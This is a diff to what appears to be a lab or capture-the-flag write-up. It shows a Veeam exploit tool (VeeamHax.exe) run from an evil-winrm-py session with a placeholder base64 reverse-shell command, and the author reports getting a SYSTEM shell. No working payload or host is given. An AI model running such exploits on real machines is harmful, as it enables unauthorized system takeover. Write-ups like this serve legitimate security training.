@@ -433,10 +433,18 @@ evil-winrm-py PS C:\exploit>
 Ill upload all 4 files
 
 ```python
-evil-winrm-py PS C:\exploit> .\VeeamHax.exe --cmd ''
+evil-winrm-py PS C:\exploit> .\VeeamHax.exe --cmd '<base64 encoded reverse shell>'
 Targeting 127.0.0.1:9401
 ```
 
+Ill use revshells to get a powershell reverse shell then drop it in the command and run it
+
+![](Pasted%20image%2020261102184441.png)
+
+I now have a shell as this SYSTEM
+
+```
+```
 
 
 
